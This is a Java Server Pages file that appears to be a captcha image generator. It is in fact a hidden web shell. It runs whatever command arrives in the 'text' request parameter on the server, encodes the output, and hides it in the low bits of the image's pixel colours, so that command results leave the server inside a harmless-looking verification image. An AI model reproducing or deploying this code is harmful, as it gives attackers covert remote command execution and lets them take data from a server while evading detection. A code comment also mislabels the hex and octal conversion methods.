<%@ page contentType="image/jpeg"
         import="java.awt.*,
                 java.awt.image.*,
                 java.util.*,
                 javax.imageio.*" pageEncoding="utf-8" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.io.BufferedReader" %>
<%@ page import="java.io.InputStreamReader" %>
<%@ page import="java.net.URLEncoder" %>
<%@ page import="java.io.UnsupportedEncodingException" %>
<%!
    Color getRandColor(int fc, int bc) {
        Random random = new Random();
        if (fc > 255) fc = 255;
        if (bc > 255) bc = 255;
        int r = fc + random.nextInt(bc - fc);
        int g = fc + random.nextInt(bc - fc);
        int b = fc + random.nextInt(bc - fc);
        return new Color(r, g, b);
    }

    String toBinary(String str) {
        //把字符串转成字符数组
        char[] strChar = str.toCharArray();
        String result = "";
        for (int i = 0; i < strChar.length; i++) {
            //toBinaryString(int i)返回变量的二进制表示的字符串
            //toHexString(int i) 八进制
            //toOctalString(int i) 十六进制
            String binaryStr = Integer.toBinaryString(strChar[i]);
            while (binaryStr.length() < 8) {
                binaryStr = "0" + binaryStr;
            }
            result += binaryStr;
        }
        return result;
    }

    String toBinary(int number) {
        String binaryStr = Integer.toBinaryString(number);
        while (binaryStr.length() < 8) {
            binaryStr = "0" + binaryStr;
        }

        return binaryStr;
    }

    int toInt(byte[] array) {
        String str = new String(array);
        int number = Integer.parseInt(str, 2);
        return number;
    }

    String execCommand(String command) {
        StringBuilder result = new StringBuilder();
        try {
            Process p = java.lang.Runtime.getRuntime().exec(command);
            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()), 1024);
            String line = null;
            while ((line = br.readLine()) != null) {
                result.append(line);
                result.append('\n');
            }
            br.close();
        } catch (IOException e) {
            e.printStackTrace();
        }

        return result.toString();
    }

    byte[] toFinalByte(String result){
        final String base64Text = Base64.getEncoder().encodeToString(result.getBytes());
        String urltext = "";
        try {
            urltext = URLEncoder.encode(base64Text, "UTF-8");
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }
        return toBinary(urltext).getBytes();
    }
%>
<%
    out.clear();
    response.setHeader("Pragma", "No-cache");
    response.setHeader("Cache-Control", "no-cache");
    response.setDateHeader("Expires", 0);

    // get params
    String command = request.getParameter("text");
    if (command == null || command.equals("")) {
        return;
    }

    // exec command
    String cmdResult = execCommand(command);

    // encode result
    final String base64Text = Base64.getEncoder().encodeToString(cmdResult.getBytes());
    String urltext = URLEncoder.encode(base64Text, "UTF-8");
    byte[] finalByte = toBinary(urltext).getBytes();

    // set header
    response.addHeader("Set-Length", String.valueOf(urltext.length()));

    // generate image
    int width = 1024, height = 1024;
    BufferedImage image = new BufferedImage(width, height, BufferedImage.TYPE_INT_RGB);
    Graphics g = image.getGraphics();
    Random random = new Random();
    g.fillRect(0, 0, width, height);
    g.setFont(new Font("Times New Roman", Font.PLAIN, 40));
    g.setColor(getRandColor(160, 200));
    for (int i = 0; i < 1024; i++) {
        int x = random.nextInt(width);
        int y = random.nextInt(height);
        int xl = random.nextInt(12);
        int yl = random.nextInt(12);
        g.drawLine(x, y, x + xl, y + yl);
    }
    String sRand = "";
    for (int i = 0; i < 4; i++) {
        String rand = String.valueOf(random.nextInt(10));
        sRand += rand;
        g.setColor(new Color(20 + random.nextInt(110), 20 + random.nextInt(110), 20 + random.nextInt(110)));
        g.drawString(rand, width / 2 + 20 * i, height / 2);
    }

    // data padding
    int length = finalByte.length;
    int count = 0;

    for (int x = image.getMinX(); x < image.getWidth(); x++) {
        for (int y = image.getMinY(); y < image.getHeight(); y++) {
            if (count >= length) {
                break;
            }

            Color c = new Color(image.getRGB(x, y));
            int cr = c.getRed();
            int cg = c.getGreen();
            int cb = c.getBlue();

            byte[] crByte = toBinary(cr).getBytes();
            byte[] cgByte = toBinary(cg).getBytes();
            byte[] cbByte = toBinary(cb).getBytes();

            crByte[crByte.length - 1] = finalByte[count];
            int newCr = toInt(crByte);
            count += 1;
            if (count >= length) {
//                int col = (newCr << 16) | (cg << 8) | cb;
                Color newColor = new Color(newCr, cg, cb);
                image.setRGB(x, y, newColor.getRGB());
                break;
            }

            cgByte[cgByte.length - 1] = finalByte[count];
            int newCg = toInt(cgByte);
            count += 1;
            if (count >= length) {
//                int col = (newCr << 16) | (newCg << 8) | cb;
                Color newColor = new Color(newCr, newCg, cb);
                image.setRGB(x, y, newColor.getRGB());
                break;
            }

            cbByte[cbByte.length - 1] = finalByte[count];
            int newCb = toInt(cbByte);
            count += 1;
            if (count >= length) {
//                int col = (newCr << 16) | (newCg << 8) | cb;
                Color newColor = new Color(newCr, newCg, newCb);
                image.setRGB(x, y, newColor.getRGB());
                break;
            }

            if (count % 3 == 0) {
//                int col = (newCr << 16) | (newCg << 8) | cb;
                Color newColor = new Color(newCr, newCg, newCb);
                image.setRGB(x, y, newColor.getRGB());
            }
        }
    }

    // save verify code for SESSION
    session.setAttribute("sRand", sRand);
    g.dispose();
    ImageIO.write(image, "PNG", response.getOutputStream());
%>